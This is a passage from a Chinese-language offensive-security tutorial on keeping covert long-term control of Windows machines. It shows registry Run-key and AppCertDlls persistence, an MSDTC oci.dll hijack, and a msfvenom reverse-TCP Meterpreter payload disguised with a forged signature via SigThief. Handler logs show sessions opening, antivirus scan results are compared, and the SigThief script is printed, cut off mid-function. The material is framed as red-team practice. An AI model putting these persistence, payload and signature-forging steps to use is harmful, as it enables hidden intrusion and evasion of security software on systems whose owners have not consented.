<p>但是由于netsh并不会开启自启动，因此还要再写一条自启动项：</p>
<pre><code class="prism language-c">reg add <span class="token string">"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"</span> <span class="token operator">/</span>v Pentestlab <span class="token operator">/</span>t REG_SZ <span class="token operator">/</span>d <span class="token string">"cmd /c C:\Windows\System32\netsh"</span>
</code></pre>
<p>重新启动后依然可获得shell：<br>
<img src="https://img-blog.csdnimg.cn/20201004230005701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
进程树和加载的恶意模块如下，隐蔽性较强：<img src="https://img-blog.csdnimg.cn/20201004230017751.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
但由于测试过程依然使用的是msf生成的DLL，启动netsh的时候会弹出黑框并阻塞，关掉netsh进程后连接也就断掉了，因此后续实战应用还需要自己写DLL。</p>
<p><strong>0x09 AppCertDlls</strong></p>
<p>权限要求：未降权的管理员权限。</p>
<p>众所周知注册表项“AppInit_DLLs”中的值会在user32.dll被加载到内存的时候被读取，若其中有值则调用API“LoadLibrary()”加载用户DLL。</p>
<p>早些年用这个做DLL注入式持久化比较流行，但如今在很多新系统上却失效了。其原因是由于kernel32.dll在启动时有一个标记位的判断，如下图：<img src="https://img-blog.csdnimg.cn/20201004230042269.png#pic_center" alt="在这里插入图片描述"><br>
kernel32.dll对0x67的Class进行NtQuerySystemInformation后，检查ReturnLength与2的运算是否为0（是否相等），若相等则不加载DLL直接ret。<br>
关于0x67在网上可以查到相关资料：<br>
<img src="https://img-blog.csdnimg.cn/20201004230055558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
它是由bcdedit.exe的“–set testsigning on/off”参数设置的，但现在比较新的机器一般都在BIOS中默认设置了secure boot，如果不关掉这个选项是无法修改上面的标记的。因此，这个方法目前局限性就比较大了。</p>
<p>然而其实还有一个注册表项不太常用，并且也能够自动加载DLL，那就是AppCertDlls。当进程使用了CreateProcess、CreateProcessAsUser、CreateProcessWithLoginW、CreateProcessWithTokenW、WinExec这些API的时候，该项中的内容会被自动加载，而幸运的，是很多程序都会调用这些API。</p>
<p>写一个测试程序调用上面的API：<br>
<img src="https://img-blog.csdnimg.cn/20201004230113291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
执行：<br>
<img src="https://img-blog.csdnimg.cn/20201004230131922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>msf上线：</p>
<p><img src="https://img-blog.csdnimg.cn/20201004230139186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>看下进程树：</p>
<p><img src="https://img-blog.csdnimg.cn/20201004230145816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
只是在正常进程下面开了个rundll32.exe，将恶意DLL加载，隐蔽性较高。<br>
但使用msf的DLL依然只能做测试，由于系统的很多程序都会调用以上API（比如explorer.exe），而msf的DLL会导致进程阻塞，最终导致启动的时候进不去桌面，因此DLL还要之后自己写。</p>
<p><strong>0x0A MSDTC</strong></p>
<p>权限要求：未降权的管理员权限。</p>
<p>msdtc.exe是微软分布式传输协调bai程序。该du进程调用系统Microsoft Personal Web Server和Microsoft SQL Server。该服务用于管理多个服务器。</p>
<p>该服务启动后会尝试从System32加载三个DLL文件：oci.dll、SQLLib80.dll、xa80.dll。服务项如下：<br>
<img src="https://img-blog.csdnimg.cn/20201004230206935.png#pic_center" alt="在这里插入图片描述"><br>
对应注册表如下：</p>
<p><img src="https://img-blog.csdnimg.cn/20201004230219690.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>在默认的Windows安装中，System32文件夹中缺少oci.dll这个文件，在获得写权限的情况下可以在该文件夹下写入一个同名的dll，服务启动时执行恶意代码。</p>
<p>默认情况下，由于启动类型设置为“手动”，通过以下命令设置自启：</p>
<pre><code class="prism language-c">sc qc msdtc
sc config msdtc start<span class="token operator">=</span> <span class="token keyword">auto</span>
</code></pre>
<p>恶意dll会被加载到msdtc.exe进程中执行，隐蔽性强：<br>
<img src="https://img-blog.csdnimg.cn/20201004230239428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>0x0B 总结</strong></p>
<p>一开始整理持久化技术的时候总共列了20种左右，但实践中发现很多持久化技术并是不通用的，例如针对特定场景，特定配置，特定应用的权限维持；甚至还有些是“被动”持久化，例如快捷方式的替换，排除利用快捷方式漏洞利用这条路，如果目标不去点是不会触发的。因此将那些局限性较大的持久化技术删掉以精简篇幅（减少工作量），最后将持久化技术精简到了以上10种，相对来说比较通用。</p>
<p>整理的过程中也发现一个Ring3中无奈的点：用户层的持久化如果想做到隐蔽性强且绕过杀软的行为检测，一定要借助Windows自带的功能（白利用），如果这些功能或模块在特殊环境中被关闭、卸载或无法正常启动就会很尴尬。因此多准备几种方法总还是很有用的。</p>
<p>由于时间关系，部分需要单独制作的DLL使用了msf直接生成的DLL进行测试，但免杀效果堪忧。后续制作CS插件的时候还需要再完成这些DLL并对其做一些免杀处理。</p>
<p>参考文章：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xz<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>t<span class="token operator">/</span><span class="token number">8095</span>
</code></pre>
<hr>
<h2><a id="7121_dayuNineteenth_Day_4704"></a>7.1.2.1 对抗权限长期把控-伪造无效签名（dayu-Nineteenth Day）</h2>
<p>专注APT攻击与防御</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>micropoor<span class="token punctuation">.</span>blogspot<span class="token punctuation">.</span>com<span class="token operator">/</span> 
</code></pre>
<p>Github：<code>https://github.com/secretsquirrel/SigThief</code></p>
<p><strong>简介：</strong></p>
<p>在实战中，尤其是需要长期控制的目标，除免杀对抗安全软件以外，还需考虑人为无 意查看恶意文件，如数字签名是否拥有。而许多安全软件，又仅仅验证是否有签名，而非验 证签名是否有效。那么针对重要的目标，需要提前做多重对抗准备。</p>
<p><strong>原始payload：</strong></p>
<pre><code class="prism language-c"><span class="token number">1</span> <span class="token punctuation">[</span>root@John html<span class="token punctuation">]</span># msfvenom ‐p windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp LHOS T<span class="token operator">=</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.104</span> LPORT<span class="token operator">=</span><span class="token number">53</span> ‐f exe <span class="token operator">&gt;</span>tmp_rev53x_64<span class="token punctuation">.</span>exe 
<span class="token number">2</span> <span class="token punctuation">[</span>‐<span class="token punctuation">]</span> No platform was selected<span class="token punctuation">,</span> choosing Msf<span class="token punctuation">:</span><span class="token punctuation">:</span>Module<span class="token punctuation">:</span><span class="token punctuation">:</span>Platform<span class="token punctuation">:</span><span class="token punctuation">:</span>Windows from the payload 
<span class="token number">3</span> <span class="token punctuation">[</span>‐<span class="token punctuation">]</span> No arch selected<span class="token punctuation">,</span> selecting arch<span class="token punctuation">:</span> x64 from the payload 
<span class="token number">4</span> No encoder or badchars specified<span class="token punctuation">,</span> outputting raw payload 
<span class="token number">5</span> Payload size<span class="token punctuation">:</span> <span class="token number">510</span> bytes <span class="token number">6</span> Final size of exe file<span class="token punctuation">:</span> <span class="token number">7168</span> bytes
</code></pre>
<p>无签名：<br>
<img src="https://img-blog.csdnimg.cn/20201005101749130.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
开启安全警告验证：<br>
<img src="https://img-blog.csdnimg.cn/20201005101806927.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
成功回连：</p>
<pre><code class="prism language-c"><span class="token number">1</span> msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 
<span class="token number">2</span>
<span class="token number">3</span> Module options <span class="token punctuation">(</span>exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span><span class="token punctuation">:</span> 
<span class="token number">4</span>
<span class="token number">5</span> Name Current Setting Required Description 
<span class="token number">6</span> ‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐ 
<span class="token number">7</span>
<span class="token number">8</span>
<span class="token number">9</span> Payload options <span class="token punctuation">(</span>windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp<span class="token punctuation">)</span><span class="token punctuation">:</span> 
<span class="token number">10</span>
<span class="token number">11</span> Name Current Setting Required Description 
<span class="token number">12</span> ‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐ 
<span class="token number">13</span> EXITFUNC process yes Exit technique <span class="token punctuation">(</span>Accepted<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span> seh<span class="token punctuation">,</span> thread<span class="token punctuation">,</span> proce ss<span class="token punctuation">,</span> none<span class="token punctuation">)</span> 
<span class="token number">14</span> LHOST <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.104</span> yes The listen address <span class="token punctuation">(</span>an interface may be speci fied<span class="token punctuation">)</span> 
<span class="token number">15</span> LPORT <span class="token number">53</span> yes The listen port 
<span class="token number">16</span>
<span class="token number">17</span>
<span class="token number">18</span> Exploit target<span class="token punctuation">:</span> 
<span class="token number">19</span>
<span class="token number">20</span> Id Name 
<span class="token number">21</span> ‐‐ ‐‐‐‐ 
<span class="token number">22</span> <span class="token number">0</span> Wildcard Target 
<span class="token number">23</span>
<span class="token number">24</span>
<span class="token number">25</span> msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit
<span class="token number">26</span>
<span class="token number">27</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.104</span><span class="token punctuation">:</span><span class="token number">53</span> 
<span class="token number">28</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">206403</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.101</span> 
<span class="token number">29</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Meterpreter session <span class="token number">2</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.104</span><span class="token punctuation">:</span><span class="token number">53</span> ‐<span class="token operator">&gt;</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.101</span><span class="token punctuation">:</span><span class="token number">32</span> <span class="token number">56</span><span class="token punctuation">)</span> at <span class="token number">2019</span>‐<span class="token number">02</span>‐<span class="token number">19</span> <span class="token number">08</span><span class="token punctuation">:</span><span class="token number">02</span><span class="token punctuation">:</span><span class="token number">52</span> ‐<span class="token number">0500</span> 
<span class="token number">30</span>
<span class="token number">31</span> meterpreter <span class="token operator">&gt;</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201005102035111.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
伪造无效签名payload：</p>
<pre><code class="prism language-c"><span class="token number">1</span> <span class="token punctuation">[</span>root@John html<span class="token punctuation">]</span># <span class="token operator">~</span><span class="token operator">/</span>SigThief<span class="token operator">/</span>sigthief<span class="token punctuation">.</span>py ‐i crashreporter<span class="token punctuation">.</span>exe<span class="token punctuation">.</span>ca ‐t tm p_rev53x_64<span class="token punctuation">.</span>exe ‐o tmp_rev53x_64<span class="token punctuation">.</span>ca<span class="token punctuation">.</span>exe 
<span class="token number">2</span> Output file<span class="token punctuation">:</span> tmp_rev53x_64<span class="token punctuation">.</span>ca<span class="token punctuation">.</span>exe 
<span class="token number">3</span> Signature appended<span class="token punctuation">.</span> 
<span class="token number">4</span> FIN<span class="token punctuation">.</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020100510214233.png#pic_center" alt="在这里插入图片描述"></p>
<p>伪造签名：<br>
<img src="https://img-blog.csdnimg.cn/20201005102149428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
成功回连：</p>
<pre><code class="prism language-c"><span class="token number">1</span> msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 
<span class="token number">2</span>
<span class="token number">3</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.104</span><span class="token punctuation">:</span><span class="token number">53</span> 
<span class="token number">4</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">206403</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.101</span> 
<span class="token number">5</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Meterpreter session <span class="token number">3</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.104</span><span class="token punctuation">:</span><span class="token number">53</span> ‐<span class="token operator">&gt;</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.101</span><span class="token punctuation">:</span><span class="token number">32</span> <span class="token number">59</span><span class="token punctuation">)</span> at <span class="token number">2019</span>‐<span class="token number">02</span>‐<span class="token number">19</span> <span class="token number">08</span><span class="token punctuation">:</span><span class="token number">04</span><span class="token punctuation">:</span><span class="token number">11</span> ‐<span class="token number">0500</span> 
<span class="token number">6</span>
<span class="token number">7</span> meterpreter <span class="token operator">&gt;</span> getpid 
<span class="token number">8</span> Current pid<span class="token punctuation">:</span> <span class="token number">972</span> 
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201005102302612.png#pic_center" alt="在这里插入图片描述"></p>
<p>靶机查看：<br>
<img src="https://img-blog.csdnimg.cn/20201005102308548.png#pic_center" alt="在这里插入图片描述"></p>
<p>世界杀毒网：原始payload VS 原始payload签名伪造</p>
<p>无证书伪造，无免杀：<br>
<img src="https://img-blog.csdnimg.cn/20201005102347881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>仅证书伪造，无免杀：<br>
<img src="https://img-blog.csdnimg.cn/20201005102356365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>以上结果佐证，许多安全软件，仅仅是验证是否有数字签名，而不确认是否有效</p>
<p>后者的话：</p>
<p>该原始python在伪造证书时，需要注意2点：</p>
<p>原始证书文件需要对应目标机的机器版本以及位数，如目标机是Windows 2003，那么需要原始带证书文件也为Windows 2003的文件。包括第三方文件。</p>
<p>伪造证书后，例：在Windows 2003 开启验安全验证后，双击无法运行，也无报 错，需要命令行下执行即可。</p>
<p>附录：sigthief.py</p>
<pre><code class="prism language-c">#<span class="token operator">!</span><span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>env python3
<span class="token macro property"># LICENSE: BSD-3</span>
<span class="token macro property"># Copyright: Josh Pitts @midnite_runr</span>

import sys
import <span class="token keyword">struct</span>
import shutil
import io
from optparse import OptionParser


def <span class="token function">gather_file_info_win</span><span class="token punctuation">(</span>binary<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token string">""</span>"
        Borrowed from BDF<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
        I could just skip to certLOC<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token operator">*</span>shrug<span class="token operator">*</span>
        <span class="token string">""</span>"
        flItms <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
        binary <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>binary<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>
        binary<span class="token punctuation">.</span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">(</span><span class="token string">'3C'</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        flItms<span class="token punctuation">[</span><span class="token string">'buffer'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
        flItms<span class="token punctuation">[</span><span class="token string">'JMPtoCodeAddress'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
        flItms<span class="token punctuation">[</span><span class="token string">'dis_frm_pehdrs_sectble'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">248</span>
        flItms<span class="token punctuation">[</span><span class="token string">'pe_header_location'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;i'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        <span class="token macro property"># Start of COFF</span>
        flItms<span class="token punctuation">[</span><span class="token string">'COFF_Start'</span><span class="token punctuation">]</span> <span class="token operator">=</span> flItms<span class="token punctuation">[</span><span class="token string">'pe_header_location'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">4</span>
        binary<span class="token punctuation">.</span><span class="token function">seek</span><span class="token punctuation">(</span>flItms<span class="token punctuation">[</span><span class="token string">'COFF_Start'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        flItms<span class="token punctuation">[</span><span class="token string">'MachineType'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;H'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        binary<span class="token punctuation">.</span><span class="token function">seek</span><span class="token punctuation">(</span>flItms<span class="token punctuation">[</span><span class="token string">'COFF_Start'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
        flItms<span class="token punctuation">[</span><span class="token string">'NumberOfSections'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;H'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'TimeDateStamp'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        binary<span class="token punctuation">.</span><span class="token function">seek</span><span class="token punctuation">(</span>flItms<span class="token punctuation">[</span><span class="token string">'COFF_Start'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
        flItms<span class="token punctuation">[</span><span class="token string">'SizeOfOptionalHeader'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;H'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'Characteristics'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;H'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        <span class="token macro property">#End of COFF</span>
        flItms<span class="token punctuation">[</span><span class="token string">'OptionalHeader_start'</span><span class="token punctuation">]</span> <span class="token operator">=</span> flItms<span class="token punctuation">[</span><span class="token string">'COFF_Start'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">20</span>

        <span class="token macro property">#<span class="token directive keyword">if</span> flItms['SizeOfOptionalHeader']:</span>
            <span class="token macro property">#Begin Standard Fields section of Optional Header</span>
        binary<span class="token punctuation">.</span><span class="token function">seek</span><span class="token punctuation">(</span>flItms<span class="token punctuation">[</span><span class="token string">'OptionalHeader_start'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        flItms<span class="token punctuation">[</span><span class="token string">'Magic'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;H'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'MajorLinkerVersion'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">"!B"</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'MinorLinkerVersion'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">"!B"</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'SizeOfCode'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">"&lt;I"</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'SizeOfInitializedData'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">"&lt;I"</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'SizeOfUninitializedData'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">"&lt;I"</span><span class="token punctuation">,</span>
                                                               binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'AddressOfEntryPoint'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'PatchLocation'</span><span class="token punctuation">]</span> <span class="token operator">=</span> flItms<span class="token punctuation">[</span><span class="token string">'AddressOfEntryPoint'</span><span class="token punctuation">]</span>
        flItms<span class="token punctuation">[</span><span class="token string">'BaseOfCode'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> flItms<span class="token punctuation">[</span><span class="token string">'Magic'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0x20B</span><span class="token punctuation">:</span>
            flItms<span class="token punctuation">[</span><span class="token string">'BaseOfData'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        <span class="token macro property"># End Standard Fields section of Optional Header</span>
        <span class="token macro property"># Begin Windows-Specific Fields of Optional Header</span>
